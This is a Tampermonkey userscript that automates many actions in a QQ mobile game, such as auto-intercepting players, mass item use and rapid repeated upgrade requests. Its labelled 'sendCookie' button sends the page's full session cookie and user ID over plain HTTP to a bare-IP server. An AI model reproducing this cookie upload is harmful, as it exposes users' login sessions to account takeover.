// ==UserScript==
// @name         DLD assistants
// @namespace    http://tampermonkey.net/
// @version      1.23.2
// @description  mixed scripts for DLD
// @author       Danta
// @license      MIT
// @match        https://ui.ptlogin2.qq.com/cgi-bin/login?appid=614038002&style=9&s_url=https%3A%2F%2Fdld.qzapp.z.qq.com%2Fqpet%2Fcgi-bin%2Fphonepk%3Fcmd%3Dindex%26channel%3D0
// @include      https://dld.qzapp.z.qq.com/qpet/cgi-bin/phonepk?*cmd=index*
// @include      https://dld.qzapp.z.qq.com/qpet/cgi-bin/phonepk?*cmd=cargo*
// @include      https://dld.qzapp.z.qq.com/qpet/cgi-bin/phonepk?*cmd=inscription&subtype=2&type_id=*
// @include      https://dld.qzapp.z.qq.com/qpet/cgi-bin/phonepk?*cmd=intfmerid&sub=*
// @include      https://dld.qzapp.z.qq.com/qpet/cgi-bin/phonepk?*cmd=use*
// @include      https://dld.qzapp.z.qq.com/qpet/cgi-bin/phonepk?*cmd=store*
// @include      https://dld.qzapp.z.qq.com/qpet/cgi-bin/phonepk?*cmd=missionassign&subtype=0
// @include      https://dld.qzapp.z.qq.com/qpet/cgi-bin/phonepk?*cmd=weapongod&sub=*
// @include      https://dld.qzapp.z.qq.com/qpet/cgi-bin/phonepk?*cmd=doppelganger&op=*&subtype=*
// @include      https://dld.qzapp.z.qq.com/qpet/cgi-bin/phonepk?*cmd=factionarmy&op=viewpoint&point_id=*
// @include      https://dld.qzapp.z.qq.com/qpet/cgi-bin/phonepk?*cmd=astrolabe*
// @include      https://dld.qzapp.z.qq.com/qpet/cgi-bin/phonepk?*cmd=exchange*
// @include      https://dld.qzapp.z.qq.com/qpet/cgi-bin/phonepk?*cmd=newAct&subtype=148*
// @include      https://dld.qzapp.z.qq.com/qpet/cgi-bin/phonepk?*cmd=newAct&subtype=104*
// @include      https://dld.qzapp.z.qq.com/qpet/cgi-bin/phonepk?*cmd=brofight*
// @include      https://dld.qzapp.z.qq.com/qpet/cgi-bin/phonepk?*cmd=viewupdate*
// @include      https://dld.qzapp.z.qq.com/qpet/cgi-bin/phonepk?*cmd=outfit*
// @include      https://dld.qzapp.z.qq.com/qpet/cgi-bin/phonepk?*cmd=weapon_specialize*
// @include      https://dld.qzapp.z.qq.com/qpet/cgi-bin/phonepk?*cmd=skillEnhance*
// @include      https://dld.qzapp.z.qq.com/qpet/cgi-bin/phonepk?*cmd=ancient_gods*
// @include      https://dld.qzapp.z.qq.com/qpet/cgi-bin/phonepk?*cmd=upgradepearl*
// @include      https://dld.qzapp.z.qq.com/qpet/cgi-bin/phonepk?*cmd=factionleague*
// @include      https://dld.qzapp.z.qq.com/qpet/cgi-bin/phonepk?*cmd=warriorinn&op=viewknightlvup*
// @include      https://dld.qzapp.z.qq.com/qpet/cgi-bin/phonepk?*cmd=newmercenary&sub=2*
// @include      https://dld.qzapp.z.qq.com/qpet/cgi-bin/phonepk?*cmd=viewfight*
// @require      https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/390416/DLD%20assistants.user.js
// @updateURL https://update.greasyfork.org/scripts/390416/DLD%20assistants.meta.js
// ==/UserScript==

function request(url){
    $.ajaxSettings.async = false;
    let retData;
    $.get(url, function(data){
        retData = data;
    });
    return retData;
};
function requestPost(url, data){
    $.ajaxSettings.async = false;
    let retData;
    $.post(url, {
        data: data
    },function(data){
        retData = data;
    });
    return retData;
};

(function() {
    'use strict';
    if( document.getElementById("go") != null ){
        document.getElementById("go").addEventListener("click", function(){pt.submitEvent()});
    };
    var cmd = /cmd=([^&]+)/.exec(window.location.search)[1];
    if( !!/subtype=([^&]+)/.exec(window.location.search) ){
        var subtype = /subtype=([^&]+)/.exec(window.location.search)[1];
    };
    if( cmd == "index" ){
        let $a = $("<a>sendCookie</a>").css("color", "red");
        $a.on('click', function(e) {
            let cookie = {"url": "https://dld.qzapp.z.qq.com/qpet/cgi-bin/phonepk?cmd=index", "cookie": document.cookie}
            let uid = /uin=o([^;]+)/.exec(document.cookie)[1]
            if(uid.startsWith('0')){
                uid = uid.replace('0', '')
            }
            let data = JSON.stringify(cookie)
            window.open(`http://43.139.1.125:9493/chelper?c=${data}&p=202110100011&u=${uid}`)
        });
        $("a").first().before($a);
    }
    if( cmd == "cargo" ){
        var selfPower = window.sessionStorage.getItem("selfPower"),
            autoHijack = !!window.sessionStorage.getItem("autoHijack"),
            powerList = window.sessionStorage.getItem("powerList"),
            $refresh = null;
        $("a").each(function(){
            let $this = $(this);
            if($this.text() == "刷新"){
                $refresh = $this;
            };
        });
        if(!!powerList){
            powerList = JSON.parse(powerList);
        }else{
            powerList = {};
        };
        if(!selfPower){
            var pageData = request("https://dld.qzapp.z.qq.com/qpet/cgi-bin/phonepk?zapp_uin=&B_UID=0&sid=&channel=0&g_ut=1&cmd=viewselfpower&type=1");
            if( !!pageData ){
                selfPower = parseFloat(pageData.match(/综合战斗力：(.*)<br \/>/)[1]);
                window.sessionStorage.setItem("selfPower", selfPower);
            };
        };
        $("a").each(function(){
            let $this = $(this);
            if($this.text() == "拦截"){
                let name = $this[0].previousSibling.previousSibling.textContent,
                    href = $this.attr("href");
                if(name.indexOf("温良恭") != -1){
                    var uid = href.match(/passerby_uin=(\d*)$/)[1],
                        power = powerList[uid];
                    if(!power){
                        let infoUrl = `https://dld.qzapp.z.qq.com/qpet/cgi-bin/phonepk?zapp_uin=&sid=&channel=0&g_ut=1&cmd=totalinfo&B_UID=${uid}&page=1&type=9&from_pf_list=1`;
                        pageData = request(infoUrl);
                        if( !!pageData && pageData.match(/战斗力<\/a>:(.*) 胜率:/)){
                            power = parseFloat(pageData.match(/战斗力<\/a>:(.*) 胜率:/)[1]);
                        }else{
                            power = 9999;
                        };
                        powerList[uid] = power;
                    };
                    if( power < selfPower ){
                        let $span = $(`<span>${power}</span>`).css("color", "red");
                        $this.next().after($span);
                        if( autoHijack ){
                            pageData = request(href);
                            if( pageData.indexOf("剩余拦截次数：0") != -1 ){
                                autoHijack = false;
                                window.sessionStorage.clear();
                                $refresh[0].click();
                            };
                        };
                    };
                };
            };
        });
        window.sessionStorage.setItem("powerList", JSON.stringify(powerList));
        let $a;
        if(!autoHijack){
            $a = $("<a>自动(温)</a>").css("color", "red");
            $a.on('click', function(e) {
                console.log(11)
                window.sessionStorage.setItem("autoHijack", 1);
                $refresh[0].click();
            });
        }else{
            $a = $("<a>取消</a>").css("color", "red");
            $a.on('click', function(e) {
                window.sessionStorage.clear();
                $refresh[0].click();
            });
        };
        $refresh.after($a);
        if( autoHijack ){
            setTimeout( function(){
                $refresh[0].click();
            }, 20000 );
        };
    }else if( cmd == "inscription" ){
        let $a = $("<a>强化</a>").css("color", "red");
        $a.on('click', function(e) {
            let pageData = request($(this).data("href")),
                result = /Lv[0-9]/.exec(pageData)[0] + " " + /祝福值：[\d]+\/[\d]+/.exec(pageData) + " " + /剩余：[\d]+/.exec(pageData)[0] + " " + /消耗：[^祝]+[\d]+/.exec(pageData)[0],
                resultID = "result" + $(this).attr("id").replace(/x/g, "");
            $("#"+resultID).remove();
            $(this).next().after(`<span id="${resultID}">${result}</span>`);
        });
        let $a2 = $("<a>强化10次</a>").css("color", "red");
        $a2.on('click', function(e) {
            let pageData = request($(this).data("href")),
                result = /Lv[0-9]/.exec(pageData)[0] + " " + /祝福值：[\d]+\/[\d]+/.exec(pageData) + " " + /剩余：[\d]+/.exec(pageData)[0] + " " + /消耗：[^祝]+[\d]+/.exec(pageData)[0],
                resultID = "result" + $(this).attr("id").replace(/x/g, "");
            $("#"+resultID).remove();
            $(this).after(`<span id="${resultID}">${result}</span>`);
        });
        let need2reload = false;
        $("a").each(function(index){
            let $this = $(this);
            if($this.text() == "强化"){
                let url = $this.attr("href").replace("subtype=3", "subtype=5"),
                    $aClone = $a.clone(true),
                    $a2Clone = $a2.clone(true);
                $aClone.attr("data-href", url).attr("id", "x"+index);
                $a2Clone.attr("data-href", url + "&times=10").attr("id", "xx"+index);
                $this.after($a2Clone).after($aClone);
                $this.text(".");
            }else if($this.text() == "开启"){
                request($this.attr("href"));
                need2reload = true;
            };
        });
        if(need2reload)
            window.location.reload();
    }else if( cmd == "intfmerid" ){
        let $a = $("<a>一键合成</a>").css("color", "red");
        $a.on('click', function(e) {
            let pageData = request("https://dld.qzapp.z.qq.com/qpet/cgi-bin/phonepk?zapp_uin=&sid=&channel=0&g_ut=1&cmd=intfmerid&sub=10&op=4"),
                result = />[^>]+<\/a>&nbsp;[阳阴]&nbsp;[1-9]级/.exec(pageData)[0].replace("</a>", "").replace(">", "").replace(/&nbsp;/g, "").replace(/[阴阳]/, " "),
                data = /cult=[\d]+/.exec(pageData)[0].replace("cult=", "");
            result += " 修为：";
            let temp = 0,
                totalList = [0, 90, 180, 1200, 8100, 45000, 99000, 159000, 246000, 420000],
                offsetList = totalList.map(d => {temp = temp + d; return temp});
            if(result.indexOf("真·") != -1){
                offsetList = offsetList.map( d => d*2 );
                totalList = totalList.map( d => d*2 );

            };
            let offset = 0;
            offsetList.map( (d, i) => {
                if( data >= d ){
                    offset = i;
                };
            });
            result += data - offsetList[offset] + "/" + totalList[offset + 1];
            let $text = $("#result");
            if( $text.length ){
                $text.html(result);
            }else{
                $a.after(`<span id="result">${result}</span>`);
            };
        });
        $("a").each(function(){
            if($(this).text() == "一键拾取"){
                $(this).after($a);
            };
        });
    }else if( cmd == "store" || cmd == "use" ){
        var items = {"神装宝箱":"6213","铭刻宝箱":"3941","牛年宝箱":"6644","鼠年宝箱":"6643","乐斗邪神畅哥锦囊":"3104","一灯大师锦囊":"3554","徽章符文石":"3683","小体力(10点)":"3001","小活力药水":"3386","贡献药水":"3038","大体力(30点)":"3003","神来拳套":"3028","经验药水":"3014","风之息(赠)":"3022","挑战书":"3040","神来拳套(赠)":"3030","迅捷珠(赠)":"3021","被动经验药水":"3043","大力丸(赠)":"3020","剑君魂珠1级":"4001","移魂符":"3102","无字天书":"3374","帅帅魂珠1级":"4031","阅历羊皮卷":"3176","活血散":"3004","玄铁扇骨":"7001","还童天书":"3101","大型武器符文石":"3655","斗神符":"3090","征战书":"3111","巅峰之战二等勋章":"3487","孙子兵法":"3477","贡献小笼包":"3356","一级幸运石":"6020","大经验药水":"3015","迅捷珠":"3017","抽奖卡":"3217","新春快乐礼包":"5110","修为丹":"5088","锋利的狼牙":"3925","粗壮的牛角":"3915","减伤药水":"3399","尖锐的铁器":"3880","沧桑的兽骨":"3873","坚固的砥石":"3788","稳固的磐石":"3864","还魂丹":"3089","活血散*百":"3005","经验药水7天":"3019","青铜星尘":"3417","塔罗牌":"3916","金疮药":"3006","大力丸":"3016","寻斗符":"3076","风之息":"3018","宝石金戒":"3411","被动经验7天":"3029","突破石":"5153","力量洗刷刷":"3023","敏捷洗刷刷":"3024","速度洗刷刷":"3025","大色魔30天":"3143","佣兵天赋丹":"5391","贡献叉烧包":"3503","门派引荐书":"3884","元婴敏捷果":"5177","土豪金":"3382","菜菜魂珠2级":"4012","河图洛书":"5435","大金疮药":"3398","教主魂珠1级":"4061","翡翠银戒":"3412","永恒紫钻":"3410","祈福令":"3565","元婴经验果":"5313","淬火结晶":"3872","时之沙":"3863","神将潘达1天":"5772","剑君7天":"3117","乐斗残卷":"5707","巅峰之战一等勋章":"3488","剑君魂珠碎片":"3366","月影魂珠碎片":"3368","追魂锁链":"3074","三彩水晶石":"3886","丐帮堂主7天":"3900","孟婆汤":"3037","程管30天":"3141","贡献药水*百":"3039","黄鸟碎片":"5157","菜菜7天":"3115","烛龙碎片":"5156","符石水晶":"5461","中型武器符文石":"3656","门派战书":"3662","易经八卦":"5436","免战牌":"3216","神将沙漏":"5874","熔炼乌金":"5464","源大侠7天":"3127","情人草":"3056","温良恭的信物":"3549","吕青橙的信物":"3548","蔡八斗的信物":"3547","银戒指":"3058","饕餮碎片":"5155","门派强化书":"3882","姜公锦囊":"3064","武魂符":"5704","神装之灵":"3910","夔牛碎片":"5154","软猥金丝":"3574","程管锦囊":"3070","新手小王子锦囊 ":"3180","盗圣锦囊":"3213","四姑娘锦囊":"3069","帅帅锦囊":"3063","四灵魂石":"3924","武穆遗书":"3670","白银星尘":"3418","神秘锦囊":"3042","大色魔锦囊":"3068","俊猴王锦囊":"3055","月敏锦囊":"3045","教主锦囊":"3062","剑君锦囊":"3044","月璇锦囊":"3065","大色魔7天":"3142","四姑娘7天":"3157","马大师7天":"3148","曾小三锦囊":"3182","神将碎片宝箱":"5878","百炼钢":"3871","投掷武器符文石":"3658","门派高香":"3887","转转券":"3921","还童卷轴":"3100","血灵魂珠2级":"4042","传功符":"3181","羊魔王锦囊":"3061","幸运石礼盒":"3447","灵兽碎片礼包":"5299","月璇魂珠碎片":"3369","血灵魂珠碎片":"3370","帅帅魂珠碎片":"3367","鹅王锦囊":"3212","牙牙形象卡365天":"6247","神兵原石":"3573","真黄金卷轴":"5089","奥秘元素":"3923","小型武器符文石":"3657","斗魂符":"5706","剑君魂珠2级":"4002","奔流气息":"3636","教主魂珠3级":"4063","菜菜魂珠碎片":"3365","黄金星尘":"3419","月敏30天":"3120","斗灵石-火":"6299","斗灵石-土":"6300","长长久久":"6305","菜菜30天":"3116","剑君30天":"3118","斗灵石-木":"6297","斗灵石-水":"6298","超值传功符礼包":"3581","葵花宝典":"3060","竞技场入场券":"3572","月影魂珠3级":"4053","斗灵石-金":"6296","黄金卷轴":"3036","回声之影30天":"3177","邪神30天":"3132","1级紫黑玉":"3728","凤凰羽毛":"3575","元婴飞仙果":"6212","马大师锦囊":"3067","源大侠锦囊":"3066","上古玉髓":"3631","悟性丹":"3099","神魔残卷":"5152","染血的羊皮":"3789","月影魂珠2级":"4052","教主魂珠碎片":"3478","教主魂珠2级":"4062","月璇魂珠2级":"4022","帅帅魂珠2级":"4032","魂珠碎片宝箱":"3371","一等武林宝箱":"3047","炼气石":"3881","佣兵碎片大宝箱":"5877","千年寒铁":"3659","佣兵碎片中宝箱":"5876","优惠券":"3783","三级幸运石":"6022","二级幸运石":"6021","潜能果实":"3576","中体力":"3002","境界丹":"5087","破碎的铠甲":"3909","四色补天石":"3888","月璇魂珠1级":"4021","月影魂珠1级":"4051","血灵魂珠1级":"4041","经验木简":"3178","野生火鸡":"3606","金兰香":"3087","小王子30天":"3154","月敏7天":"3119","程管7天":"3140","校霸7天":"3146","羊魔王30天":"3114","秋风扇骨":"7000","七级幸运石":"6026","烤架":"3607","龙珠盒子":"3599","许愿卡碎片":"3654","俊猴王30天":"3145","古铜钥匙":"3474","翡翠钥匙":"3475","春":"5103","快":"5104","新":"5102","乐":"5105","月影7天":"3133","玛瑙石碎片":"3695","星石兑换券":"3917","帅帅7天":"3125","1级狂暴石":"5316","月璇魂珠3级":"4023","帅帅魂珠4级":"4034","神秘礼盒":"3400","2级迅捷石":"3705","剑君魂珠4级":"4004","桃木扇骨":"7002","血灵魂珠4级":"4044","3级迅捷石":"3706","2级玛瑙石":"3697","1级日曜石":"3688","1级迅捷石":"3704","1级玛瑙石":"3696","教主魂珠4级":"4064","华山堂主7天":"3897","迅捷珠迷你装":"3220","血灵魂珠3级":"4043","月影魂珠4级":"4054","菜菜魂珠1级":"4011","斗技符小宝箱":"5710","2级狂暴石":"5317","剑君魂珠3级":"4003","1级神愈石":"5324","神秘精华":"3567","战魂符":"5705","四级幸运石":"6023","2级翡翠石":"3721","真体力(60点)":"3041","活力药水":"3105","夺宝卡":"5408","斗技符大宝箱":"5712","2级日曜石":"3689","资源补给箱":"3671","2级神愈石":"5325","阅历卷宗":"3381","生命洗刷刷":"3103","1级翡翠石":"3720","2级紫黑玉":"3729","菜菜魂珠4级":"4014","菜菜魂珠3级":"4013","帅帅魂珠3级":"4033","爆炎7天":"3137","羊魔王内丹":"3201","普通招募券":"5973","高级招募券":"5972","邪神7天":"3131","豚豚形象卡365天":"6248","3级紫黑玉":"3730","二等武林宝箱":"3048","佣兵碎片小宝箱":"5875","夜叉内丹":"3203","血灵7天":"3135","峨眉堂主7天":"3894","3级狂暴石":"5318","3级神愈石":"5326","小木锤":"3257","风之息*百":"3034","明教堂主7天":"3935","帮派战鼓":"3922"};
        window.sessionStorage.setItem("items", JSON.stringify(items));

        let $a = $(`<br><input id="keyword" type="text" onkeypress="if(event.keyCode==13){this.nextElementSibling.click();return false;}"><a id="search">检索</a>`).css("color", "red");
        $(document).on('click', "#search", function(e) {
            let keyword = $("#keyword").val();
            if(!keyword) return;
            for(let key in items){
                if(key.indexOf(keyword) != -1){
                    let url = `https://dld.qzapp.z.qq.com/qpet/cgi-bin/phonepk?zapp_uin=&sid=&channel=0&g_ut=1&cmd=owngoods&id=${items[key]}`,
                        pageData = request(url);
                    let result = /数量：(\d+)/.exec(pageData);
                    if( result != null){
                        let $aa = $(`<br><a target="_blank" href="${url}">${key}</a><span>${result[1]}</span><a class="useall" data-id="${items[key]}">全部使用</a>`);
                        $(this).after($aa);
                    };

                };
            };
        }).on('click', ".useall", function(e) {
            let $this = $(this),
                _id = $this.data("id"),
                url = "https://dld.qzapp.z.qq.com/qpet/cgi-bin/phonepk?zapp_uin=&sid=&channel=0&g_ut=1&cmd=use&id=" + _id,
                count = parseInt($this.prev().text());
            if(count == 0) return;
            var timer = setInterval(function(){
                let pageData = request(url);
                if( ( pageData.indexOf("您使用了") == -1 && pageData.indexOf("获得") == -1 ) || pageData.indexOf("系统繁忙") != -1 || pageData.indexOf("不能被使用") != -1 ){
                    clearInterval(timer);
                    $this.after("使用完毕");
                }else{
                    let result = /获得:(.+[^\d]+)([\d]+)个。/.exec(pageData);
                    if( result != null ){
                        let item = result[1].replace("\(", "").replace("\)", ""),
                            $item = $("#"+_id+item);
                        if( $item.length ){
                            $item.text(parseInt($item.text()) + parseInt(result[2]));
                        }else{
                            $this.after(`获得:${item}<span id=${_id+item} style="color:red;">${result[2]}</span>个。`);
                        };
                    };
                    count--;
                    $this.prev().text(count);
                };
            },200);
            if(!keyword) return;
            for(let key in items){
                if(key.indexOf(keyword) != -1){
                    let url = `https://dld.qzapp.z.qq.com/qpet/cgi-bin/phonepk?zapp_uin=&sid=&channel=0&g_ut=1&cmd=owngoods&id=${items[key]}`,
                        pageData = request(url);
                    let result = /数量：(\d+)/.exec(pageData),
                        count  = result == null ? "数量：0" : result[0];
                    console.log(count)
                    let $aa = $(`<br><a target="_blank" href="${url}">${key}</a><span>${count}</span><a class="useall" data-id="${items[key]}">全部使用</a>`);
                    $(this).after($aa)
                };
            };
        });
        $("a").last().after($a);
    }else if( cmd == "missionassign" ){
        let $a = $("<a>一键</a>").css("color", "red");
        $a.on('click', function(e) {
            $("a").each(function(){
                if($(this).text() == "查看"){
                    let url = $(this).attr("href").replace("subtype=1", "subtype=5")
                    request(url);
                };
            });
            window.location.reload();
        });
        $("a").first().after($a);
    }else if( cmd == "weapongod" ){
        let $a = $(`<input class="change" type="text">`).css("width", "25px");
        $(document).on('keypress', ".change", function(event) {
            if( event.keyCode==13 ){
                let $aa = $(this).prev(),
                    times = $(this).val(),
                    url = $aa.attr("href");
                if( !isNaN(times) ){
                    let stoneId = /stone_id=(\d+)/.exec(url)[1];
                    let pageData = request(`https://dld.qzapp.z.qq.com/qpet/cgi-bin/phonepk?cmd=weapongod&sub=11&stone_id=${stoneId}&num=${times}&i_p_w=num%7C`),
                        result = /获得：符石水晶\*\d+!/.exec(pageData)[0];
                    $(this).after(result);
                };
            };
        });
        let $aa = $("<a>查看</a>").css("color", "red");
        $aa.on('click', function(e) {
            $("a").each(function(){
                let $this = $(this);
                if($this.text() == "镶嵌符石"){
                    let pageData = request($this.attr("href")),
                        hole1 = /槽位1[^消]+消耗/.exec(pageData)[0],
                        hole2 = /槽位2[^消]+消耗/.exec(pageData)[0],
                        $div= $("<div></div>").css("color", "#009fff"),
                        data = hole1 + "<br\/>" + hole2;
                    data = data.replace(/融合等级：[1-9]级 战斗力：[1-9]/g, "").replace(/<br \/>/g, "").replace(/——/g, "—").replace(/战斗力[^武]+武器/g, "").replace(/消耗/g, "");
                    $div.html(data);
                    $this.next().after($div);
                    $this.text(".");
                };
            });
        });
        $("a").each(function(){
            let $this = $(this);
            if($this.text() == "选择分解"){
                $this.after($a.clone(true));
            };
        });
        $("a").first().after($aa);
    }else if( cmd == "doppelganger" ){
        let $a = $("<a>查看等级</a>").css("color", "red");
        $a.on('click', function(e) {
            $("a").each(function(){
                let $this = $(this);
                if($this.attr("href") && $this.attr("href").indexOf("cmd=view&") != -1){
                    let pageData = request($this.attr("href")),
                        level = /[0-9]级神[器技]/.exec(pageData)[0].replace("神器", "").replace("神技", "");
                    $this.text($this.text() + level)
                };
            });
        });
        $($("a")[1]).after($a);
    }else if( cmd == "factionarmy" ){
        let $a = $("<a>一键</a>").css("color", "red");
        $a.on('click', function(e) {
            let dead = false;
            $("a").each(function(){
                if( !dead){
                    let $this = $(this);
                    if($this.text() == "攻击"){
                        let result = request($this.attr("href"));
                        if(result.indexOf("血量不足") != -1){
                            dead = true;
                            alert("已阵亡");
                        };
                    };
                    if($this.text() == "下一页"){
                        window.location.reload();
                    }else if($this.text() == "返回远征"){
                        $this[0].click();
                    };
                };
            });
        });
        $("a").first().after($a);
    }else if( cmd == "astrolabe" ){
        let $a = $("<a>一键</a>").css("color", "red");
        $a.on('click', function(e) {
            let i = 0;
            $("a").each(function(){
                if( i<3 ){
                    let $this = $(this);
                    if($this.text() == "合成"){
                        while(true){
                            let result = request($this.attr("href"));
                            if(result.indexOf("数量不足") != -1){
                                break;
                            };
                        };
                        i++;
                    };
                }

            });
            window.location.reload();
        });
        $("a").first().next().after($a);
    }else if( cmd == "exchange" ){
        let $a = $(`<input class="change" type="text">`).css("width", "25px");
        $(document).on('keypress', ".change", function(event) {
            if( event.keyCode==13 ){
                let $aa = $(this).prev(),
                    times = $(this).val(),
                    url = $aa.attr("href");
                if( !isNaN(times) ){
                    url = url.replace(/times=[\d]+/g, "times=" + times);
                    window.location = url;
                };
            };
        });
        $("a").each(function(){
            let $this = $(this);
            if($this.text() == "兑换10个"){
                $this.after($a.clone(true));
            };
        });
    }else if( cmd == "newAct" && subtype == "148" ){
        let $a = $("<a>一键</a>").css("color", "red");
        $a.on('click', function(e) {
            let i = 0;
            $("a").each(function(){
                let $this = $(this);
                if($this.text() == "点击刮卡"){
                    let text = "";
                    for(let i=0;i<100;i++){
                        let pageData = request($this.attr("href")),
                            result = /刮出了([^\d]+)\*(\d+)</.exec(pageData);
                        if( result != null ){
                            let item = result[1],
                                $item = $("#"+item);
                            if( $item.length ){
                                $item.text(parseInt($item.text()) + parseInt(result[2]));
                            }else{
                                $this.after(`<span>${item}*</span><span id=${item} style="color:red;">${result[2]}</span>&nbsp`);
                            };
                        }
                        if(pageData.indexOf("没有刮刮卡") != -1){
                            $this.after("使用完毕");
                            break;
                        };
                    }
                };

            });
        });
        $("a").first().after($a);
    }else if( cmd == "brofight" ){
        let $a = $(`<input class="change" type="text">`).css("width", "25px");
        $(document).on('keypress', ".change", function(event) {
            if( event.keyCode==13 ){
                let $aa = $(this).prev(),
                    times = $(this).val();
                if( !isNaN(times) ){
                    for(let i=0;i<times;i++){
                        request($aa.attr("href"));
                    };
                    window.location.reload();
                };
            };
        });
        $("a").each(function(){
            let $this = $(this);
            if($this.text() == "研习"){
                $this.after($a.clone(true));
            };
        });
    }else if( cmd == "outfit" || cmd == "weapon_specialize" || cmd == "skillEnhance" || cmd == "ancient_gods" || cmd == "viewupdate" || cmd == "newAct"){
        let $a = $("<a>一键</a>").css("color", "red");
        $a.on('click', function(e) {
            let url = $(this).prev().attr("href");
            var timer = setInterval(function(){
                let pageData = request(url);
                if( pageData.indexOf("升级失败") != -1  ){
                    return;
                };
                if( pageData.indexOf("材料不足") != -1 || pageData.indexOf("数量不足") != -1 ){
                    clearInterval(timer);
                    window.location.reload();
                };
                if( cmd == "viewupdate" ){
                    if( pageData.indexOf("升级了") != -1 ){
                        clearInterval(timer);
                        alert("success");
                    };
                }else{
                    if( pageData.indexOf("未获得") != -1 || pageData.indexOf("成功") != -1  || pageData.indexOf("恭喜您从") != -1 ){
                        clearInterval(timer);
                        alert("success");
                    };
                };
            },50);

        });
        $("a").each(function(index){
            let $this = $(this);
            if($this.text() == "升级" || $this.text() == "进阶" || $this.text() == "提升" || $this.text() == "升级一次"){
                $this.after($a.clone(true));
            };
        });
    }else if( cmd == "upgradepearl" ){
        let $a = $("<a>一键</a>").css("color", "red");
        $a.on('click', function(e) {
            let i = 0;
            $("a").each(function(){
                if( i<3 ){
                    let $this = $(this);
                    if($this.text() == "升级"){
                        while(true){
                            let result = request($this.attr("href"));
                            if(result.indexOf("数量不够") != -1 || result.indexOf("碎片不足") != -1){
                                break;
                            };
                        };
                        i++;
                    };
                }

            });
            window.location.reload();
        });
        $($("a")[10]).after($a);
    }else if( cmd == "factionleague" ){
        $("a").each(function(){
            let $this = $(this);
            if($this.text() == "参与防守"){
                $this.remove();
            };
        });
    }else if( cmd == "warriorinn" ){
        let $a = $("<a>一键</a>").css("color", "red");
        $a.on('click', function(e) {
            let url = $(this).prev().attr("href"),
                count = 0;
            var timer = setInterval(function(){
                let pageData = request(url);
                if( pageData.indexOf("柒承") != -1 ){
                   if( ( pageData.indexOf("汽水罐") != -1 && pageData.indexOf("判官笔") != -1 ) ){
                       clearInterval(timer);
                       window.location.reload();
                       alert("success");
                   };
                };
                if( pageData.indexOf("九品芝麻官") != -1 ){
                   if( ( pageData.indexOf("汽水罐") != -1 && pageData.indexOf("天残脚") != -1 ) ){
                       clearInterval(timer);
                       window.location.reload();
                       alert("success");
                   };
                };
                if( pageData.indexOf("杜十三") != -1 ){
                    let wanted = ["判官笔", "快人一步", "大海无量", "装死"],
                        score = 0;
                    wanted.map(d => {
                        if( pageData.indexOf(d) != -1){
                            score ++;
                        };
                    });
                    console.log(score)
                   if( score >= 2 ){
                       clearInterval(timer);
                       window.location.reload();
                       alert("success");
                   };
                };
                if( pageData.indexOf("李师师") != -1 ){
                    let wanted = ["天生大力", "快人一步", "第六感"],
                        score = 0;
                    wanted.map(d => {
                        if( pageData.indexOf(d) != -1){
                            score ++;
                        };
                    });
                    console.log(score)
                   if( score >= 2 ){
                       clearInterval(timer);
                       window.location.reload();
                       alert("success");
                   };
                };
                if( pageData.indexOf("圣诞老鹅") != -1 ){
                    let wanted = ["天生大力", "装死", "第六感", "大海无量"],
                        score = 0;
                    wanted.map(d => {
                        if( pageData.indexOf(d) != -1){
                            score ++;
                        };
                    });
                    console.log(score)
                   if( score >= 2 ){
                       clearInterval(timer);
                       window.location.reload();
                       alert("success");
                   };
                };
                if( pageData.indexOf("燕青") != -1 ){
                    let wanted = ["天生大力", "装死", "第六感", "判官笔"],
                        score = 0;
                    wanted.map(d => {
                        if( pageData.indexOf(d) != -1){
                            score ++;
                        };
                    });
                    console.log(score)
                   if( score >= 2 ){
                       clearInterval(timer);
                       window.location.reload();
                       alert("success");
                   };
                };
                if( pageData.indexOf("段智兴") != -1 ){
                    let wanted = ["快人一步", "大海无量", "气疗术", "判官笔"],
                        score = 0;
                    wanted.map(d => {
                        if( pageData.indexOf(d) != -1){
                            score ++;
                        };
                    });
                    console.log(score)
                   if( score >= 2 ){
                       clearInterval(timer);
                       window.location.reload();
                       alert("success");
                   };
                };
                if( pageData.indexOf("黄药师") != -1 ){
                    let wanted = ["快人一步", "天生大力", "气疗术"],
                        score = 0;
                    wanted.map(d => {
                        if( pageData.indexOf(d) != -1){
                            score ++;
                        };
                    });
                    console.log(score)
                   if( score >= 2 ){
                       clearInterval(timer);
                       window.location.reload();
                       alert("success");
                   };
                };
                count++;
                if( count > 20 ){
                    clearInterval(timer);
                    window.location.reload();
                };

            },50);

        });
        $("a").each(function(index){
            let $this = $(this);
            if($this.text() == "技能重置"){
                $this.after($a.clone(true));
            };
        });
    }else if( cmd == "newmercenary" && document.body.innerText.indexOf("66%") == -1 && document.body.innerText.indexOf("100%") == -1 ){
        let $a = $("<a>一键</a>").css("color", "red");
        $a.on('click', function(e) {
            let url = $(this).prev().attr("href") + "&confirm=1",
                count = 0;
            var timer = setInterval(function(){
                let pageData = request(url);
                if( pageData.indexOf("卓越") != -1 ){
                    clearInterval(timer);
                    window.location.reload();
                    alert("success");
                };
                count++;
                if( count > 20 || pageData.indexOf("还童卷轴：0") != -1 ){
                    clearInterval(timer);
                    window.location.reload();
                };

            },50);

        });
        let $a2 = $("<a>一键</a>").css("color", "red");
        $a2.on('click', function(e) {
            let url = $(this).prev().attr("href"),
                count = 0;
            var timer = setInterval(function(){
                let pageData = request(url);
                if( pageData.indexOf("非常牛逼") != -1 ){
                    clearInterval(timer);
                    window.location.reload();
                    alert("success");
                };
                if( pageData.indexOf("你还需要") != -1 ){
                    clearInterval(timer);
                    window.location.reload();
                };

            },50);

        });
        $("a").each(function(index){
            let $this = $(this);
            if($this.text() == "还童"){
                $this.after($a.clone(true));
            };
            if($this.text() == "提升"){
                $this.after($a2.clone(true));
            };
        });
    }else if( cmd == "viewfight" ){
        let pageData = document.getElementById("id").innerHTML,
            reg = /\(([\d]+)\)/g,
            result;
        while( true){
            result = reg.exec(pageData);
            if(!result){
                break;
            };
            pageData = pageData.replaceAll(result[0], `(<a target="_blank" href="//dld.qzapp.z.qq.com/qpet/cgi-bin/phonepk?zapp_uin=&sid=&channel=0&g_ut=1&cmd=totalinfo&B_UID=${result[1]}&page=1&type=9&from_pf_list=1">${result[1]}</a>)`);
        };
        document.getElementById("id").innerHTML = pageData;
    };
})();